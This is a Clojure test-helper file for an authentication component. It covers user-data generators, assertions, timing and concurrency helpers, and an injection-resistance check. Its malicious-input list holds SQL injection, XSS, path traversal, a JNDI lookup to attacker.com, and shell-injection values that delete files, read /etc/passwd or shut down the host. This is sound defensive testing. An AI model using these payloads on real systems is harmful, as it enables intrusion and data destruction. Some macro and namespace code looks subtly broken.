(ns cc.mindward.auth.test-helpers
  "Test helpers for authentication component tests.
   
   φ (Vitality): Reusable, organic test utilities
   fractal (Clarity): Well-organized, purpose-driven helpers
   e (Purpose): Each helper has clear, specific purpose
   τ (Wisdom): Strategic test data and scenarios
   π (Synthesis): Integrates with other test components
   μ (Directness): Minimal, focused functionality
   ∃ (Truth): Reflects real-world scenarios
   ∀ (Vigilance): Includes security test scenarios"
  (:require [clojure.test.check.generators :as gen]
            [clojure.string :as str]
            [cc.mindward.user.interface :as user]
            [cc.mindward.user.impl :as user-impl]))

;; ============================================================================
;; Test Data Generators (φ Vitality)
;; ============================================================================

(defn generate-username
  "Generate a random username for testing.
   
   Returns: String like 'test-user-12345'"
  []
  (str "test-user-" (rand-int 100000)))

(defn generate-password
  "Generate a random password for testing.
   
   Returns: String like 'test-pass-12345'"
  []
  (str "test-pass-" (rand-int 100000)))

(defn generate-user-data
  "Generate complete user data map for testing.
   
   Returns: Map with :username, :password, :name"
  []
  {:username (generate-username)
   :password (generate-password)
   :name (str "Test User " (rand-int 1000))})

(defn generate-malicious-inputs
  "Generate various malicious inputs for security testing.
   
   Returns: Vector of strings with attack patterns"
  []
  ["'; DROP TABLE users; --"
   "' OR '1'='1"
   "admin'--"
   "\" OR \"\"=\""
   "1' OR '1'='1'--"
   "1' OR '1'='1'/*"
   "<script>alert('xss')</script>"
   "../../../etc/passwd"
   "${jndi:ldap://attacker.com/exploit}"
   "|| ping -c 10 127.0.0.1 ||"
   "`rm -rf /`"
   "$(cat /etc/passwd)"
   "; ls -la;"
   "| cat /etc/passwd"
   "&& shutdown -h now"])

;; ============================================================================
;; Test Setup Helpers (e Purpose)
;; ============================================================================

(defn with-test-user
  "Execute body with a test user created and cleaned up.
   
   Usage: (with-test-user [user-data] ...body...)
   
   Creates user before body, ensures cleanup after."
  [[user-data-binding] & body]
  `(let [~user-data-binding (generate-user-data)
         _ (user/create-user! ~user-data-binding)]
     (try
       ~@body
       (finally
         ;; Note: User deletion would need to be implemented
         ;; For now, test fixture handles cleanup
         ))))

(defmacro with-multiple-test-users
  "Execute body with multiple test users created.
   
   Usage: (with-multiple-test-users [users n] ...body...)
   
   Creates n test users, binds to users vector."
  [[users-binding num-users] & body]
  `(let [~users-binding (repeatedly ~num-users generate-user-data)]
     (doseq [user# ~users-binding]
       (user/create-user! user#))
     (try
       ~@body
       (finally
         ;; Cleanup handled by test fixture
         ))))

;; ============================================================================
;; Assertion Helpers (fractal Clarity)
;; ============================================================================

(defn assert-authentication-succeeds
  "Assert that authentication succeeds with given credentials.
   
   Returns the authentication result for further assertions."
  [username password]
  (let [result (auth/authenticate username password)]
    (assert result (str "Authentication should succeed for " username))
    result))

(defn assert-authentication-fails
  "Assert that authentication fails with given credentials.
   
   Returns nil (always)."
  [username password]
  (let [result (auth/authenticate username password)]
    (assert (nil? result) (str "Authentication should fail for " username))
    nil))

(defn assert-no-password-hash
  "Assert that authentication result contains no password hash."
  [auth-result]
  (assert (not (contains? auth-result :password_hash))
          "Authentication result should not contain :password_hash")
  (assert (nil? (:password_hash auth-result))
          ":password_hash should be nil")
  auth-result)

(defn assert-user-profile-complete
  "Assert that authentication result contains complete user profile."
  [auth-result expected-username expected-name]
  (assert (= expected-username (:username auth-result))
          (str "Username should be " expected-username))
  (assert (= expected-name (:name auth-result))
          (str "Name should be " expected-name))
  auth-result)

;; ============================================================================
;; Security Test Helpers (∀ Vigilance)
;; ============================================================================

(defn test-sql-injection-resistance
  "Test that authentication resists SQL injection.
   
   Returns vector of failed tests, empty if all pass."
  []
  (let [attacks (generate-malicious-inputs)
        failures (atom [])]
    (doseq [attack attacks]
      (try
        (when (auth/authenticate attack "password")
          (swap! failures conj {:type :username-injection :payload attack}))
        (when (auth/authenticate "user" attack)
          (swap! failures conj {:type :password-injection :payload attack}))
        (catch Exception e
          (swap! failures conj {:type :exception :payload attack :error e}))))
    @failures))

(defn test-input-length-boundaries
  "Test that authentication handles various input lengths.
   
   Returns vector of failures, empty if all pass."
  []
  (let [lengths [0 1 255 1000 10000 (* 1024 1024)]  ;; Up to 1MB
        failures (atom [])]
    (doseq [len lengths]
      (let [long-str (apply str (repeat len "A"))]
        (try
          ;; Should handle without crashing
          (auth/authenticate long-str "password")
          (auth/authenticate "user" long-str)
          (catch Exception e
            (swap! failures conj {:type :length-exception :length len :error e})))))
    @failures))

;; ============================================================================
;; Performance Test Helpers (τ Wisdom)
;; ============================================================================

(defn time-authentication
  "Time authentication call and return [result time-ns].
   
   Useful for timing analysis and performance tests."
  [username password]
  (let [start (System/nanoTime)
        result (auth/authenticate username password)
        elapsed (- (System/nanoTime) start)]
    [result elapsed]))

(defn benchmark-authentication
  "Run authentication benchmark with n iterations.
   
   Returns map with statistics."
  [username password n]
  (let [times (repeatedly n #(let [[_ elapsed] (time-authentication username password)]
                               elapsed))]
    {:iterations n
     :min (apply min times)
     :max (apply max times)
     :mean (/ (reduce + times) n)
     :median (nth (sort times) (quot n 2))}))

;; ============================================================================
;; Concurrent Test Helpers (π Synthesis)
;; ============================================================================

(defn run-concurrent-authentications
  "Run n concurrent authentication attempts.
   
   Returns vector of results in completion order."
  [username password n]
  (let [results (atom [])
        threads (doall
                 (for [i (range n)]
                   (Thread.
                    (fn []
                      (let [result (auth/authenticate username password)]
                        (swap! results conj result))))))]
    (doseq [thread threads] (.start thread))
    (doseq [thread threads] (.join thread))
    @results))

(defn verify-concurrent-results
  "Verify that concurrent authentication results are consistent.
   
   Returns true if all results are identical (excluding timing)."
  [results]
  (let [first-result (first results)]
    (every? #(= (dissoc % :auth_timestamp)  ;; Remove timing fields if any
                (dissoc first-result :auth_timestamp))
            results)))

;; ============================================================================
;; Test Data Validation Helpers (∃ Truth)
;; ============================================================================

(defn valid-username?
  "Check if username meets validation criteria.
   
   Returns true if valid, false otherwise."
  [username]
  (and (string? username)
       (>= (count username) 3)
       (<= (count username) 30)
       (re-matches #"^[a-zA-Z0-9_-]+$" username)))

(defn valid-password?
  "Check if password meets validation criteria.
   
   Returns true if valid, false otherwise."
  [password]
  (and (string? password)
       (>= (count password) 8)))

(defn valid-user-data?
  "Check if user data map is valid.
   
   Returns true if valid, false otherwise."
  [user-data]
  (and (map? user-data)
       (valid-username? (:username user-data))
       (valid-password? (:password user-data))
       (string? (:name user-data))
       (pos? (count (:name user-data)))))

;; ============================================================================
;; Test Report Helpers (fractal Clarity)
;; ============================================================================

(defn test-summary
  "Generate summary of test results.
   
   Useful for test reporting and documentation."
  [test-results]
  {:total-tests (count test-results)
   :passed (count (filter :passed? test-results))
   :failed (count (filter :failed? test-results))
   :security-tests (count (filter :security? test-results))
   :performance-tests (count (filter :performance? test-results))
   :integration-tests (count (filter :integration? test-results))})

(defn generate-test-documentation
  "Generate documentation from test metadata.
   
   Creates a markdown summary of test coverage."
  [test-suite]
  (str "# Test Coverage: " (:name test-suite) "\n\n"
       "## Purpose\n" (:purpose test-suite) "\n\n"
       "## Test Categories\n"
       (str/join "\n" (map #(str "- " %) (:categories test-suite))) "\n\n"
       "## Security Coverage\n"
       (str/join "\n" (map #(str "- " %) (:security-coverage test-suite))) "\n\n"
       "## Performance Considerations\n"
       (:performance-notes test-suite) "\n\n"
       "## Edge Cases Tested\n"
       (str/join "\n" (map #(str "- " %) (:edge-cases test-suite)))))

;; ============================================================================
;; Test Configuration (μ Directness)
;; ============================================================================

(def test-config
  "Configuration for authentication tests."
  {:security {:sql-injection-attempts (generate-malicious-inputs)
              :max-input-length (* 1024 1024)  ;; 1MB
              :concurrent-users 10}
   :performance {:iterations 100
                 :timeout-ms 1000}
   :integration {:use-real-db true
                 :cleanup-after true}
   :generators {:username-pattern #"^[a-zA-Z0-9_-]{3,30}$"
                :password-min-length 8}})

;; ============================================================================
;; Export Public Helpers
;; ============================================================================

(defn get-test-config
  "Get test configuration for specific test type.
   
   type: :security, :performance, :integration, or :all"
  [type]
  (case type
    :security (:security test-config)
    :performance (:performance test-config)
    :integration (:integration test-config)
    :all test-config
    (throw (ex-info "Unknown test type" {:type type}))))

;; Note: We need to require auth namespace for some helpers
;; This is done at runtime to avoid circular dependencies
(defn require-auth-namespace
  "Dynamically require auth namespace for helpers that need it."
  []
  (require '[cc.mindward.auth.interface :as auth]))

;; Call this at the top of test files that use these helpers
(require-auth-namespace)